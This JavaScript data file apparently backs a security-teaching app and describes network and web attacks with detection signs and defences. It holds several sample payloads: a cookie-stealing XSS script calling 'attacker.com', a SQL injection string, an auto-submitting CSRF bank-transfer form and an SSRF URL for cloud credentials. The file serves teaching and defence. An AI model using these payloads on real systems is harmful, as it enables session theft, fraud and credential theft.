// ========================================================
// Attacks & Exploits Data
// Network Attacks, Web Attacks, OWASP Top 10, Mitigations
// ========================================================

const NETWORK_ATTACKS_DATA = [
  {
    id: "ddos",
    name: "Distributed Denial of Service (DDoS)",
    category: "Availability",
    layersTargeted: "Layers 3, 4, 7",
    mechanism: "A coordinated botnet floods a target network, server, or application with overwhelming volume of packets, connections, or requests to render services unavailable to legitimate users.",
    subtypes: [
      "SYN Flood (Layer 4): Exploits TCP handshake state exhaustion",
      "UDP Amplification (Layer 4): Exploits open NTP, DNS, or Memcached servers with spoofed source IPs",
      "HTTP Flood / Slowloris (Layer 7): Exhausts web server worker threads by sending slow partial HTTP headers"
    ],
    detectionIndicators: [
      "Sudden massive spike in inbound bps / pps traffic",
      "Asymmetrical ratio of inbound SYN packets vs ACK responses",
      "Traffic originating from globally distributed untrusted ASN prefixes"
    ],
    mitigation: [
      "Cloud-based scrubbing centers (Anycast BGP routing)",
      "Linux kernel SYN Cookies (`sysctl -w net.ipv4.tcp_syncookies=1`)",
      "Rate limiting and connection limits at border load balancers (e.g. Nginx `limit_conn_zone`)"
    ]
  },
  {
    id: "mitm",
    name: "Man-in-the-Middle (MitM)",
    category: "Confidentiality & Integrity",
    layersTargeted: "Layers 2, 3, 6, 7",
    mechanism: "Attacker places themselves between communication endpoints to intercept, eavesdrop, and inject malicious payload into live traffic without either party knowing.",
    subtypes: [
      "ARP Poisoning (Layer 2): Sends forged ARP messages over LAN to associate attacker MAC with default gateway IP",
      "DNS Spoofing (Layer 7): Injects bogus DNS responses directing client to rogue IP",
      "SSL Stripping (Layer 6/7): Downgrades HTTPS links to plaintext HTTP before forwarding to client"
    ],
    detectionIndicators: [
      "Conflicting MAC addresses reported for gateway IP in `arp -a`",
      "Sudden TLS certificate warnings (unknown CA, untrusted root)",
      "High volume of unsolicited gratuitous ARP replies"
    ],
    mitigation: [
      "Dynamic ARP Inspection (DAI) & DHCP Snooping on switches",
      "HTTP Strict Transport Security (HSTS) with preloading",
      "Mutual TLS (mTLS) with pinned certificates"
    ]
  },
  {
    id: "arp-spoofing",
    name: "ARP Spoofing / Poisoning",
    category: "Confidentiality & Integrity",
    layersTargeted: "Layer 2 (Data Link)",
    mechanism: "Exploits the stateless and unauthenticated nature of ARP by continuously broadcasting fake ARP replies claiming that the attacker's MAC address owns the router's IP address.",
    subtypes: [
      "One-way ARP Poisoning (intercepts client outbound traffic)",
      "Two-way ARP Poisoning (intercepts both client and router traffic for full duplex MitM)",
      "ARP DoS (announcing non-existent MAC address, dropping all packets)"
    ],
    detectionIndicators: [
      "Multiple IP addresses pointing to the same physical MAC address",
      "Network latency doubling as traffic is rerouted through an attacker host",
      "IDS alerts: `ET INFO Suspicious Gratuitous ARP Request`"
    ],
    mitigation: [
      "Enable Dynamic ARP Inspection (DAI) on managed switches",
      "Use static ARP tables for mission-critical core servers",
      "Deploy 802.1X Network Access Control (NAC) to prevent rogue devices from joining LAN"
    ]
  },
  {
    id: "dns-poisoning",
    name: "DNS Cache Poisoning",
    category: "Integrity & Availability",
    layersTargeted: "Layer 7 (Application)",
    mechanism: "Attacker tricks a recursive DNS resolver into caching fraudulent IP mappings for a legitimate domain (e.g., bank.com -> attacker's phishing server IP).",
    subtypes: [
      "Kaminsky Attack: Floods resolver with queries for random subdomains while guessing transaction ID and UDP port",
      "Rogue DNS Resolver: Forcing DHCP to assign attacker-controlled DNS servers",
      "DNS Hijacking: Compromising domain registrar credentials"
    ],
    detectionIndicators: [
      "Mismatch between authoritative name server records and local DNS resolver response",
      "Flood of high-rate DNS responses with mismatched query transaction IDs",
      "Suspiciously high TTL values on redirected records"
    ],
    mitigation: [
      "Deploy DNSSEC (DNS Security Extensions) to validate cryptographic digital signatures",
      "Use Source Port Randomization (SPR) across all 65,535 UDP ports for resolver queries",
      "Enforce DNS-over-HTTPS (DoH) or DNS-over-TLS (DoT)"
    ]
  },
  {
    id: "packet-sniffing",
    name: "Packet Sniffing / Eavesdropping",
    category: "Confidentiality",
    layersTargeted: "Layers 2 through 7",
    mechanism: "Using network analysis tools (Wireshark, tcpdump, Tshark) to capture and inspect raw packet frames passing across an Ethernet broadcast domain or mirrored switch port.",
    subtypes: [
      "Passive Sniffing: Reading broadcast/multicast packets on unswitched hubs or open Wi-Fi",
      "Active Sniffing: Combined with ARP poisoning or MAC flooding to force switches to broadcast frames across all ports"
    ],
    detectionIndicators: [
      "Network interfaces configured in promiscuous mode (detectable via ARP ping tests)",
      "MAC flooding attacks overflowing switch CAM tables",
      "Unusual SPAN/mirror port configurations on core switches"
    ],
    mitigation: [
      "Mandate end-to-end encryption for all protocols (HTTPS, SSH, SFTP, IPSec)",
      "Enable switch Port Security to prevent CAM table overflow attacks",
      "Segment critical data VLANs from general user workstations"
    ]
  },
  {
    id: "port-scanning",
    name: "Port Scanning & Reconnaissance",
    category: "Reconnaissance",
    layersTargeted: "Layer 4 (Transport)",
    mechanism: "Systematically probing a target's IP address across port numbers to identify open ports, listening services, OS versions, and misconfigured software before launching an exploit.",
    subtypes: [
      "TCP SYN Scan (-sS): Half-open stealth scan; sends SYN, receives SYN-ACK, responds with RST",
      "TCP Connect Scan (-sT): Full 3-way handshake; slower and logged by target OS",
      "UDP Scan (-sU): Sends empty UDP datagrams; listens for ICMP Port Unreachable (Type 3 Code 3)"
    ],
    detectionIndicators: [
      "High rate of SYN packets arriving without subsequent application data or ACK completions",
      "Sequential connection attempts spanning dozens of ports in milliseconds from a single source",
      "IDS alerts: `Nmap Reconnaissance Detected`"
    ],
    mitigation: [
      "Block unused ports with stateful firewall default-deny rules",
      "Configure Port Knocking or Single Packet Authorization (SPA)",
      "Deploy Honeypots and dynamic rate-limiting (Fail2ban/CrowdSec)"
    ]
  }
];

const WEB_ATTACKS_DATA = [
  {
    id: "xss",
    name: "Cross-Site Scripting (XSS)",
    owaspRank: "A03:2021 - Injection",
    mechanism: "Attacker injects malicious client-side JavaScript code into a trusted website, which executes within an unsuspecting victim's browser context.",
    subtypes: [
      "Stored XSS: Payload permanently stored in database and served to multiple users",
      "Reflected XSS: Payload reflected off web server immediately via search queries or error messages",
      "DOM-based XSS: Vulnerability resides entirely in client-side JavaScript reading untrusted inputs (e.g. `location.hash`)"
    ],
    impact: "Session cookie theft, account takeover, keylogging, arbitrary DOM manipulation, credential harvesting.",
    samplePayload: "<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>",
    defense: [
      "Context-aware output encoding (HTML, JavaScript, Attribute, CSS)",
      "Content Security Policy (CSP): `Content-Security-Policy: default-src 'self'; script-src 'self'`",
      "Set `HttpOnly` and `SameSite=Strict` flags on all session cookies",
      "Use modern frameworks (React, Angular) that auto-escape interpolated expressions"
    ]
  },
  {
    id: "sqli",
    name: "SQL Injection (SQLi)",
    owaspRank: "A03:2021 - Injection",
    mechanism: "Attacker manipulates database queries by injecting untrusted malicious SQL syntax into user input fields that get concatenated directly into SQL command strings.",
    subtypes: [
      "In-band / Union-based SQLi: Attacker extracts data directly via the same HTTP response using `UNION SELECT`",
      "Error-based SQLi: Attacker forces database engine errors that leak sensitive schema or user details",
      "Blind SQLi (Boolean / Time-based): Attacker infers data character-by-character based on conditional TRUE/FALSE or `pg_sleep(5)` / `WAITFOR DELAY`"
    ],
    impact: "Complete database takeover, data exfiltration, authentication bypass, data destruction, and potential OS command execution (`xp_cmdshell`).",
    samplePayload: "' OR 1=1; --",
    defense: [
      "Use Parameterized Queries / Prepared Statements exclusively",
      "Use Object-Relational Mappers (ORMs) with safe query builders",
      "Apply principle of least privilege to database service accounts",
      "Deploy Web Application Firewalls (WAF) to detect common SQL injection signatures"
    ]
  },
  {
    id: "csrf",
    name: "Cross-Site Request Forgery (CSRF)",
    owaspRank: "A01:2021 - Broken Access Control",
    mechanism: "Tricks an authenticated victim into executing unwanted state-changing actions (password changes, fund transfers) on a web application in which they are currently authenticated.",
    subtypes: [
      "GET-based CSRF: Exploiting state-changing GET endpoints via `<img src='http://bank.com/transfer?to=attacker&amt=5000'>`",
      "POST-based CSRF: Hidden HTML forms auto-submitted via JavaScript on malicious websites"
    ],
    impact: "Unauthorized actions performed under the victim's authenticated identity without their consent.",
    samplePayload: "<form action='http://bank.com/transfer' method='POST'><input type='hidden' name='to' value='attacker'/></form><script>document.forms[0].submit()</script>",
    defense: [
      "Anti-CSRF Tokens: Unique, cryptographically random, per-session synchronizer tokens validated on state-changing requests",
      "Set `SameSite=Lax` or `SameSite=Strict` on session cookies",
      "Verify `Origin` and `Referer` headers on all state-changing HTTP requests",
      "Require re-authentication or MFA for critical actions"
    ]
  },
  {
    id: "ssrf",
    name: "Server-Side Request Forgery (SSRF)",
    owaspRank: "A10:2021 - Server-Side Request Forgery",
    mechanism: "Attacker abuses web server functionality (e.g. image fetcher, webhook caller, PDF generator) to force the backend server to send HTTP requests to unintended internal destinations.",
    subtypes: [
      "Basic SSRF: Server displays internal response directly to attacker",
      "Blind SSRF: Server makes request but does not return payload response (exfiltration via DNS out-of-band)",
      "Cloud Metadata Exfiltration: Requesting `http://169.254.169.254/latest/meta-data/` on AWS/GCP/Azure to harvest IAM access keys"
    ],
    impact: "Cloud IAM credential theft, internal network port scanning, accessing internal administrative consoles.",
    samplePayload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    defense: [
      "Strict allowlist of permitted destination domains and protocols (disable `file://`, `gopher://`, `dict://`)",
      "Block access to internal IP ranges (RFC 1918: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16) and link-local (169.254.169.254)",
      "Require IMDSv2 on AWS EC2 instances with token hop limits"
    ]
  }
];

if (typeof module !== "undefined" && module.exports) {
  module.exports = { NETWORK_ATTACKS_DATA, WEB_ATTACKS_DATA };
}
